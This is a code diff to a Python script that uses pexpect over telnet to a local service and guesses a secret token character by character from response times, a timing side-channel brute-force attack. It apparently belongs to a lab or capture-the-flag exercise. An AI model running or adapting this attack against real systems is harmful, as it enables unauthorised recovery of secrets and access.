@@ -6,9 +6,9 @@ import pexpect
 
 TELNET_HOST = "127.0.0.1"
 TELNET_PORT = 5555
-N = 10 # Number of requests to make for each guess
-TOKEN_SIZE = 4 # Size of the token to guess
-TA_COMMAND = "ta_secret -e sample.txt key"  
+N = 1 # Number of requests to make for each guess
+TOKEN_SIZE = 7 # Size of the token to guess
+TA_COMMAND = "ta_secret -a 0 1"  
 
 # Global child process 
 child = None
@@ -34,13 +34,13 @@ def try_to_hack(characters):
                 continue """
                         
             start = time.time()
-            print(f"{TA_COMMAND} {characters}")
             child.sendline(f"{TA_COMMAND} {characters}")
             child.expect("#")
             end = time.time()
             timings.append(end - start)
             output = child.before.decode("utf-8", errors="ignore")
-                      
+            print(f"{TA_COMMAND} {characters}: time={end - start:.4f}")
+
             
             # Check if successful (adjust based on your app's output)
             if ("success" in output.lower() or "correct" in output.lower()) and "wrong" not in output.lower():
@@ -73,7 +73,7 @@ def find_next_character(base):
     
     print(f"\n[*] Testing position {len(base) + 1}/{TOKEN_SIZE}")
     
-    for c in string.ascii_lowercase:
+    for c in string.printable:
         guess = base + c + 'a' * (TOKEN_SIZE - len(base) - 1)
         #print(f"\n[*] Trying: {guess}", end=' ', flush=True)
         
